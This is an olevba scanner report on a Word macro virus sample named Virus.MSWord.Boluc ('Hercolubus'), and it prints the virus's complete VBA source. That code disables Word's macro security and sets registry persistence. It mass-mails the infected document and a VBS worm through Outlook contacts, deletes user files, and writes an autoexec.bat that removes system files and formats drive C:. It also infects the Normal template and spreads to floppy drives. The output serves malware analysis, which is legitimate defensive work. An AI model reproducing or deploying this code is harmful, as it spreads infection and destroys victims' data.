olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Boluc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Boluc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO eradic.bas 
in file: ./Virus.MSWord.Boluc - OLE stream: 'Macros/VBA/eradic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub eradic()
On Error Resume Next
    Dim filh1, filN
    Set fsote = CreateObject("Scripting.FileSystemObject")
    Set filh1 = fsote.OpenTextFile("c:\THWIN.txt")
    trp = filh1.readAll
    filh1.Close
    Set filN = fsote.CreateTextFile("c:\THWIN.txt")
    filN.WriteLine trp
    filN.WriteLine "nlines = jui.CodeModule.CountOfLines"
    filN.WriteLine "jui.CodeModule.DeleteLines 1, nlines"
    filN.WriteLine "jui.Name = " + Chr(34) + "Hercolubus" + Chr(34)
    her = "jui.codemodule."
    co = "Inse"
    lu = "rtLi"
    bus = "nes "
    raptor = her & co & lu & bus
    geno = "Sub "
    cida = "Docum"
    fa = "ent_Cl"
    tal = "ose()"
    filN.WriteLine raptor + "1, " + Chr(34) + geno + cida + fa + tal + Chr(34)
    filN.WriteLine raptor + "2, " + Chr(34) + "On Error Resume Next" + Chr(34)
    filN.WriteLine raptor + "3, " + Chr(34) + "Set eDrive = CreateObject(" + Chr(34) + " + Chr(34) + " + Chr(34) + "Scripting.FileSystemObject" + Chr(34) + " + Chr(34) + " + Chr(34) + ")" + Chr(34)
    filN.WriteLine raptor + "4, " + Chr(34) + "hn = Application.Path & " + Chr(34) + " + Chr(34) +" + Chr(34) + "\Microsoft.doc" + Chr(34) + "+ chr(34)"
    filN.WriteLine raptor + "5, " + Chr(34) + "If eDrive.FileExists(hn) Then" + Chr(34)
    filN.WriteLine raptor + "6, " + Chr(34) + "Application.ScreenUpdating = False" + Chr(34)
    filN.WriteLine raptor + "7, " + Chr(34) + "nDoc = ActiveDocument.FullName" + Chr(34)
    filN.WriteLine raptor + "8, " + Chr(34) + "If nDoc <> " + Chr(34) + " + Chr(34) +" + Chr(34) + "C:\Microsof.doc" + Chr(34) + " + Chr(34) + " + Chr(34) + " Then" + Chr(34)
    filN.WriteLine raptor + "9, " + Chr(34) + "Nam = ActiveDocument.Name" + Chr(34)
    filN.WriteLine raptor + "10, " + Chr(34) + "nNam = Len(Nam)" + Chr(34)
    filN.WriteLine raptor + "11, " + Chr(34) + "If Right(Nam, 3) = " + Chr(34) + " + Chr(34) + " + Chr(34) + "doc" + Chr(34) + " + chr(34) + " + Chr(34) + " Then" + Chr(34)
    filN.WriteLine raptor + "12, " + Chr(34) + "sEo = Left(Nam, nNam - 4)" + Chr(34)
    filN.WriteLine raptor + "13, " + Chr(34) + "PostN = ActiveDocument.VBProject.VBComponents.count" + Chr(34)
    filN.WriteLine raptor + "14, " + Chr(34) + "For j = 1 To PostN" + Chr(34)
    filN.WriteLine raptor + "15, " + Chr(34) + "Set Pert = ActiveDocument.VBProject.VBComponents.Item(j)" + Chr(34)
    filN.WriteLine raptor + "16, " + Chr(34) + "If Pert.Name = " + Chr(34) + " + Chr(34) +" + Chr(34) + "Hercolubus" + Chr(34) + " + Chr(34) + " + Chr(34) + " Then" + Chr(34)
    filN.WriteLine raptor + "17, " + Chr(34) + "Exit For" + Chr(34)
    filN.WriteLine raptor + "18, " + Chr(34) + "Else" + Chr(34)
    filN.WriteLine raptor + "19, " + Chr(34) + "If j = PostN Then" + Chr(34)
    filN.WriteLine raptor + "20, " + Chr(34) + "Documents.Open FileName:=(hn)" + Chr(34)
    filN.WriteLine raptor + "21, " + Chr(34) + "kh = Dir(hn)" + Chr(34)
    filN.WriteLine raptor + "22, " + Chr(34) + "nC = Len(kh)" + Chr(34)
    filN.WriteLine raptor + "23, " + Chr(34) + "sE = Left(kh, nC - 4)" + Chr(34)
    filN.WriteLine raptor + "24, " + Chr(34) + "Application.Windows(sEo).Activate" + Chr(34)
    filN.WriteLine raptor + "25, " + Chr(34) + "ActiveDocument.SaveAs Filename:=" + Chr(34) + " + Chr(34) + " + Chr(34) + "C:\Microsof.doc" + Chr(34) + " + Chr(34)"
    filN.WriteLine raptor + "26, " + Chr(34) + "ActiveDocument.Select" + Chr(34)
    filN.WriteLine raptor + "27, " + Chr(34) + "Selection.Copy" + Chr(34)
    filN.WriteLine raptor + "28, " + Chr(34) + "Application.Windows(sE).Activate" + Chr(34)
    filN.WriteLine raptor + "29, " + Chr(34) + "Selection.Paste" + Chr(34)
    filN.WriteLine raptor + "30, " + Chr(34) + "ActiveDocument.SaveAs Filename:=nDoc" + Chr(34)
    filN.WriteLine raptor + "31, " + Chr(34) + "ScreenUpdating = True" + Chr(34)
    filN.WriteLine raptor + "32, " + Chr(34) + "ActiveDocument.Close" + Chr(34)
    filN.WriteLine raptor + "33, " + Chr(34) + "End If" + Chr(34)
    filN.WriteLine raptor + "34, " + Chr(34) + "End If" + Chr(34)
    filN.WriteLine raptor + "35, " + Chr(34) + "Next j"""
    filN.WriteLine raptor + "36, " + Chr(34) + "End If" + Chr(34)
    filN.WriteLine raptor + "37, " + Chr(34) + "End If" + Chr(34)
    filN.WriteLine raptor + "38, " + Chr(34) + "End If" + Chr(34)
    filN.WriteLine raptor + "39, " + Chr(34) + "Set Drv = eDrive.GetDrive(" + Chr(34) + " + Chr(34) + " + Chr(34) + "A:" + Chr(34) + " + Chr(34) + " + Chr(34) + ")" + Chr(34)
    filN.WriteLine raptor + "40, " + Chr(34) + "If Drv.IsReady Then" + Chr(34)
    filN.WriteLine raptor + "41, " + Chr(34) + "eDrive.CopyFile eDrive.GetSpecialFolder(1) & " + Chr(34) + "+ Chr(34) + " + Chr(34) + "\Hola.vbs" + Chr(34) + " + Chr(34) + " + Chr(34) + " , " + Chr(34) + " + Chr(34) + " + Chr(34) + "A:\Hola.vbs" + Chr(34) + " + Chr(34)"
    filN.WriteLine raptor + "42, " + Chr(34) + "End If" + Chr(34)
    filN.WriteLine raptor + "43, " + Chr(34) + "End Sub" + Chr(34)
    filN.WriteLine "End If"
    filN.WriteLine "oWord.Quit"
    filN.WriteLine "End Sub"
    
    filN.WriteLine "Sub wini()"
    filN.WriteLine "On Error Resume Next"
    filN.WriteLine "fsoST.RegWrite " + Chr(34) + "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\THWIN" + Chr(34) + ",sysdir&" + Chr(34) + "\THWIN.vbs" + Chr(34)
    filN.WriteLine "fsoST.RegWrite " + Chr(34) + "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\level" + Chr(34) + ",1," + Chr(34) + "REG_DWORD" + Chr(34)
    filN.WriteLine "End Sub"

    filN.WriteLine "Sub mesg()"
    filN.WriteLine "On Error Resume Next"
    filN.WriteLine "Dim Mensaje"
    filN.WriteLine "Dim Estilo"
    filN.WriteLine "Dim Titulo"
    filN.WriteLine "Dim Respuesta"
    filN.WriteLine "If fso.FileExists(sysdir&" + Chr(34) + "\Helow.vbs" + Chr(34) + ") = False then"
    filN.WriteLine "file.copy(sysdir&" + Chr(34) + "\Helow.vbs" + Chr(34) + ")"
    filN.WriteLine "Mensaje = " + Chr(34) + "Hola.. Quisiera tener una linda amistad contigo, no sé si recuerdas la vez que platicamos en el chat;" + Chr(34) + " + Chr(13) +" + Chr(34) + " yo solo recordaba tu e-mail y la verdad me agradó tu plática y me pareces una buena persona" + Chr(34) + " + Chr(13) +" + Chr(34) + "Quisiera comunicarme continuamente contigo." + Chr(34) + " + Chr(13) +" + Chr(34) + "Estaré esperando tu respuesta, escríbeme." + Chr(34) + " + Chr(13) + Chr(13) +" + Chr(34) + "HASTA PRONTO" + Chr(34)
    filN.WriteLine "Estilo = vbInformation"
    filN.WriteLine "Titulo = " + Chr(34) + "HOLA" + Chr(34)
    filN.WriteLine "Respuesta = MsgBox(Mensaje, Estilo, Titulo)"
    filN.WriteLine "End If"
    filN.WriteLine "End Sub"
    filN.Close
    Set filN = fsote.getFile("C:\THWIN.txt")
    filN.Copy (fsote.GetSpecialFolder(1) & "\THWIN.vbs")
    Set filN = fsote.getFile("C:\THWIN.txt")
    filN.Delete
End Sub
    
-------------------------------------------------------------------------------
VBA MACRO Hercol.bas 
in file: ./Virus.MSWord.Boluc - OLE stream: 'Macros/VBA/Hercol'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.Run Macroname:="Hercolubus"
End Sub
Sub Autoclose()
Application.Run Macroname:="Planeta"
End Sub
-------------------------------------------------------------------------------
VBA MACRO Hercolubus.bas 
in file: ./Virus.MSWord.Boluc - OLE stream: 'Macros/VBA/Hercolubus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub Hercolubus()
' Macro virus HERCOLUBUS, Copyright 2001
' Email Hercolubus@terra.com
' Versión Prueba
On Error Resume Next
Dim fsob
Set fsob = CreateObject("Scripting.FileSystemObject")
hDvI = fsob.GetSpecialFolder(1)
hDi = Application.Path & "\Microsoft.doc"
Set modreg = CreateObject("wscript.Shell")
modreg.regWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\THWIN", hDvI & "\THWIN.vbs"
CommandBars("Tools").Controls("macro").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\SoftWare\Microsoft\Office\9.0\Word\security", "level") = 1&
Options.ConfirmConversions = False: Options.VirusProtection = False: Options.SaveNormalPrompt = False
If fsob.FileExists(hDi) = False Or Day(Now) Mod 30 = 0 Then
    Dim oOutlook, nMapi, cItem
    Set oOutlook = CreateObject("Outlook.Application")
    Set nMapi = oOutlook.GetNameSpace("MAPI")
    If oOutlook = "Outlook" Then
        nMapi.Logon "Profile", "password"
        For y = 1 To nMapi.AddressLists.count
            Set NueLib = nMapi.AddressLists(y)
            Set cItem = oOutlook.CreateItem(0)
            For Va = 1 To NueLib.AddressEntries.count
                Uf = NueLib.AddressEntries(Va)
                cItem.Recipients.Add Uf
                If Va > 70 Then Exit For
            Next Va
            cItem.Subject = "Lo que necesitabas"
            cItem.Body = "Aquí te envío algo que pueda ser de tu interés"
            cItem.Attachments.Add ActiveDocument.FullName
            cItem.Send
            Uf = ""
        Next y
        nMapi.Logoff
    End If
End If

hDv = hDvI & "\THWIN.vbs"
If fsob.FileExists(hDv) = False Then
    Dim filh1
    Set filh1 = fsob.CreateTextFile("c:\THWIN.txt", True)
    filh1.WriteLine "REM 25/02/2001"
    filh1.WriteLine ("On Error Resume Next")
    filh1.WriteLine "Dim X"
    filh1.WriteLine "Dim fso"
    filh1.WriteLine "Dim fil4"
    filh1.WriteLine "Dim nD"
    filh1.WriteLine "Dim file"
    filh1.WriteLine "Set fso = CreateObject(" + Chr(34) + "Scripting.FileSystemObject" + Chr(34) + ")"
    filh1.WriteLine "Set fsoST = WScript.CreateObject(" + Chr(34) + "WScript.Shell" + Chr(34) + ")"
    filh1.WriteLine "Set sysdir = fso.GetSpecialFolder(1)"
    filh1.WriteLine "Set file = fso.GetFile(WScript.ScriptFullName)"
    filh1.WriteLine "If fso.FileExists(sysdir&" + Chr(34) + "\Hola.vbs" + Chr(34) + ") = False then"
    filh1.WriteLine "file.copy(sysdir&" + Chr(34) + "\THWIN.vbs" + Chr(34) + ")"
    filh1.WriteLine "file.copy(sysdir&" + Chr(34) + "\Hola.vbs" + Chr(34) + ")"
    filh1.WriteLine "Dim oOutlook, nMapi, cItem"
    filh1.WriteLine "Set oOutLook = CreateObject(" + Chr(34) + "Outlook.Application" + Chr(34) + ")"
    filh1.WriteLine "Set nMapi = oOutlook.getNameSpace(" + Chr(34) + "MAPI" + Chr(34) + ")"
    filh1.WriteLine "If oOutlook = " + Chr(34) + "Outlook" + Chr(34) + " Then"
    filh1.WriteLine "nMapi.Logon " + Chr(34) + "Profile" + Chr(34) + ", " + Chr(34) + "password" + Chr(34)
    filh1.WriteLine "For y = 1 To nMapi.AddressList.Count"
    filh1.WriteLine "Set NuevLib = nmapi.Addresslist(y)"
    filh1.WriteLine "Set cItem = oOutlook.CreateItem(0)"
    filh1.WriteLine "For Va = 1 To NueLib.AddressEntries.count"
    filh1.WriteLine "Uf = NueLib.AddressEntries(Va)"
    filh1.WriteLine "cItem.Recipients.Add Uf"
    filh1.WriteLine "If Va > 70 Then Exit For"
    filh1.WriteLine "Next"
    filh1.WriteLine "cItem.Subject = " + Chr(34) + "Hola" + Chr(34)
    filh1.WriteLine "cItem.Body = " + Chr(34) + "Un recuerdo para tí en en Archivo Adjunto" + Chr(34)
    filh1.WriteLine "cItem.Attachments.Add (sysdir&" + Chr(34) + "\Hola.vbs" + Chr(34) + ")"
    filh1.WriteLine "cItem.Send"
    filh1.WriteLine "Uf = " + Chr(34) + Chr(34)
    filh1.WriteLine "Next"
    filh1.WriteLine "nMapi.Logoff"
    filh1.WriteLine "End If"
    filh1.WriteLine "End If"
    
    filh1.WriteLine ("Randomize")
    filh1.WriteLine ("nD = Int((33 * Rnd) + 1)")
    filh1.WriteLine ("If nD < 32 Then")
    filh1.WriteLine ("If nD >= 1 And nD <= 2 Then cFiles =" + Chr(34) + "xls" + Chr(34))
    filh1.WriteLine ("If nD > 2 And nD <= 4 Then cFiles =" + Chr(34) + "dbf" + Chr(34))
    filh1.WriteLine ("If nD > 4 And nD <= 5 Then cFiles =" + Chr(34) + "wav" + Chr(34))
    filh1.WriteLine ("If nD > 5 And nD <= 7 Then cFiles =" + Chr(34) + "dwg" + Chr(34))
    filh1.WriteLine ("If nD > 7 And nD <= 9 Then cFiles =" + Chr(34) + "mp3" + Chr(34))
    filh1.WriteLine ("If nD > 9 And nD <= 11 Then cFiles =" + Chr(34) + "bak" + Chr(34))
    filh1.WriteLine ("If nD > 11 And nD <= 14 Then cFiles =" + Chr(34) + "wav" + Chr(34))
    filh1.WriteLine ("If nD > 14 And nD <= 16 Then cFiles =" + Chr(34) + "bmp" + Chr(34))
    filh1.WriteLine ("If nD > 16 And nD <= 18 Then cFiles =" + Chr(34) + "htm" + Chr(34))
    filh1.WriteLine ("If nD > 18 And nD <= 20 Then cFiles =" + Chr(34) + "hlp" + Chr(34))
    filh1.WriteLine ("If nD > 20 And nD <= 22 Then cFiles =" + Chr(34) + "chm" + Chr(34))
    filh1.WriteLine ("If nD > 22 And nD <= 24 Then cFiles =" + Chr(34) + "jpg" + Chr(34))
    filh1.WriteLine ("If nD > 24 And nD <= 26 Then cFiles =" + Chr(34) + "gif" + Chr(34))
    filh1.WriteLine ("If nD > 26 And nD <= 27 Then cFiles =" + Chr(34) + "scr" + Chr(34))
    filh1.WriteLine ("If nD > 27 And nD <= 28 Then cFiles =" + Chr(34) + "cdr" + Chr(34))
    filh1.WriteLine ("If nD > 28 And nD <= 31 Then cFiles =" + Chr(34) + "ttf" + Chr(34))
    filh1.WriteLine ("If fso.FileExists(sysdir & " + Chr(34) + "\ListWin.txt" + Chr(34) + ") Then")
    filh1.WriteLine ("Set List1 = fso.OpentextFile(sysdir & " + Chr(34) + "\ListWin.txt" + Chr(34) + ")")
    filh1.WriteLine ("HL = List1.ReadAll")
    filh1.WriteLine ("List1.Close")
    filh1.WriteLine ("Else")
    filh1.WriteLine ("HL = " + Chr(34) + "ARCHIVOS" + Chr(34))
    filh1.WriteLine ("End If")
    filh1.WriteLine ("Set List1 = fso.CreateTextFile(sysdir & " + Chr(34) + "\ListWin.txt" + Chr(34) + ")")
    filh1.WriteLine ("List1.WriteLine (HL)")
    filh1.WriteLine ("hode()")
    filh1.WriteLine ("List1.Close")
    filh1.WriteLine ("Else")
    filh1.WriteLine ("If Date > DateSerial(2001, 5, 27) Then")
    filh1.WriteLine ("Dim fil1")
    filh1.WriteLine ("Dim fil2")
    filh1.WriteLine ("Dim wt")
    filh1.WriteLine ("Dim fil3")
    filh1.WriteLine ("Dim s")
    filh1.WriteLine ("Set fil1 = fso.OpenTextFile(" + Chr(34) + "c:\Autoexec.bat" + Chr(34) + ")")
    filh1.WriteLine ("s = fil1.readAll")
    filh1.WriteLine ("fil1.Close")
    filh1.WriteLine ("Set fil2 = fso.createTextFile(" + Chr(34) + "c:\hercolubus.txt" + Chr(34) + ", True)")
    filh1.WriteLine ("fil2.write (s)")
    filh1.WriteLine ("fil2.WriteLine (" + Chr(34) + "@echo off" + Chr(34) + ")")
    filh1.WriteLine ("fil2.WriteLine (" + Chr(34) + "DEL " + Chr(34) + "&sysdir&" + Chr(34) + "\*.SYS" + Chr(34) + ")")
    filh1.WriteLine ("fil2.WriteLine (" + Chr(34) + "DEL " + Chr(34) + "&sysdir&" + Chr(34) + "\*.DLL" + Chr(34) + ")")
    filh1.WriteLine ("fil2.WriteLine (" + Chr(34) + "DEL " + Chr(34) + "&sysdir&" + Chr(34) + "\*.OCX" + Chr(34) + ")")
    filh1.WriteLine ("fil2.WriteLine (" + Chr(34) + "CLS" + Chr(34) + ")")
    filh1.WriteLine ("fil2.WriteLine (" + Chr(34) + "FORMAT C: /u /v:HERCOLUBUS /autotest" + Chr(34) + ")")
    filh1.WriteLine ("fil2.WriteLine (" + Chr(34) + "if not errorlevel 0 goto FORMAT_ERROR" + Chr(34) + ")")
    filh1.WriteLine ("fil2.WriteLine (" + Chr(34) + "CLS" + Chr(34) + ")")
    filh1.WriteLine ("fil2.Close")
    filh1.WriteLine ("Set fil3 = fso.GetFile(" + Chr(34) + "c:\hercolubus.txt" + Chr(34) + ")")
    filh1.WriteLine ("fil3.Copy (" + Chr(34) + "c:\Autoexec.bat" + Chr(34) + ")")
    filh1.WriteLine ("Set fil3 = fso.GetFile(" + Chr(34) + "c:\hercolubus.txt" + Chr(34) + ")")
    filh1.WriteLine ("fil3.Delete")
    filh1.WriteLine ("End If")
    filh1.WriteLine ("End If")
    filh1.WriteLine "wini()"
    filh1.WriteLine "mesg()"
    filh1.WriteLine "oprog()"
    filh1.WriteLine ("Sub hode()")
    filh1.WriteLine "Dim d,dc,s"
    filh1.WriteLine "X=0"
    filh1.WriteLine "Set dc = fso.drives"
    filh1.WriteLine "For Each d In dc"
    filh1.WriteLine "If d.DriveType = 2 Or d.DriveType = 3 Then"
    filh1.WriteLine "If x < 3 Then Busc(d)"
    filh1.WriteLine "End If"
    filh1.WriteLine "Next"
    filh1.WriteLine "End Sub"
    filh1.WriteLine "Sub Busc(nFolder)"
    filh1.WriteLine "On Error Resume Next"
    filh1.WriteLine "set f=fso.GetFolder(nFolder&" + Chr(34) + "\" + Chr(34) + ")"
    filh1.WriteLine "Set sf = f.SubFolders"
    filh1.WriteLine "For Each f1 In sf"
    filh1.WriteLine "If x < 3 Then"
    filh1.WriteLine "files1(f1&" + Chr(34) + "\" + Chr(34) + ")"
    filh1.WriteLine "Else"
    filh1.WriteLine "Exit For"
    filh1.WriteLine "End If"
    filh1.WriteLine "If x < 3 Then"
    filh1.WriteLine "Busc(f1&" + Chr(34) + "\" + Chr(34) + ")"
    filh1.WriteLine "Else"
    filh1.WriteLine "Exit For"
    filh1.WriteLine "End If"
    filh1.WriteLine "Next"
    filh1.WriteLine "End Sub"

    filh1.WriteLine "Sub Files1(subF)"
    filh1.WriteLine "On Error Resume Next"
    filh1.WriteLine "Set f2 = fso.GetFolder(subF)"
    filh1.WriteLine "Set fc = f2.Files"
    filh1.WriteLine "For Each fl In fc"
    filh1.WriteLine "ext = fso.GetExtensionName(fl.Path)"
    filh1.WriteLine "If ext = cFiles Then"
    filh1.WriteLine "If x < 3 Then"
    filh1.WriteLine ("List1.WriteLine Now & " + Chr(34) + " " + Chr(34) + " & fl.Path")
    filh1.WriteLine "Set oFil = fso.getFile(fl.Path)"
    filh1.WriteLine "oFil.delete"
    filh1.WriteLine "x = x + 1"
    filh1.WriteLine "Else"
    filh1.WriteLine "Exit For"
    filh1.WriteLine "End If"
    filh1.WriteLine "End If"
    filh1.WriteLine "Next"
    filh1.WriteLine "End Sub"
    
    filh1.WriteLine "Sub oprog()"
    filh1.WriteLine "On Error Resume Next"
    filh1.WriteLine "Set oWord = CreateObject(" + Chr(34) + "Word.Application" + Chr(34) + ")"
    filh1.WriteLine "oWord.Options.SaveNormalPrompt = False"
    filh1.WriteLine "oWord.CommandBars(" + Chr(34) + "Tools" + Chr(34) + ").Controls(" + Chr(34) + "Macro" + Chr(34) + ").Enabled = False"
    filh1.WriteLine "oWord.Options.VirusProtection = False"
    filh1.WriteLine ("Set jui = oWord.NormalTemplate.VBProject.VBComponents.Item(1)")
    filh1.WriteLine ("If jui.Name <> " + Chr(34) + "Hercolubus" + Chr(34) + " Then")
    filh1.Close
    Application.Run Macroname:="Eradic"
End If

End Sub

Sub Planeta()
    On Error Resume Next
    Dim fsotx
    Application.DisplayAlerts = False
    Application.ScreenUpdating = False
    Options.ConfirmConversions = False
    Set fsotx = CreateObject("Scripting.FileSystemObject")
    If fsotx.FileExists(Application.Path & "\Microsoft.doc") = False Then
      ActiveDocument.Select
      Selection.Delete
      ActiveDocument.SaveAs FileName:=(Application.Path & "\Microsoft.doc")
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Autoclose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Hola.vbs            |Executable file name                         |
|IOC       |THWIN.vbs           |Executable file name                         |
|IOC       |Helow.vbs           |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

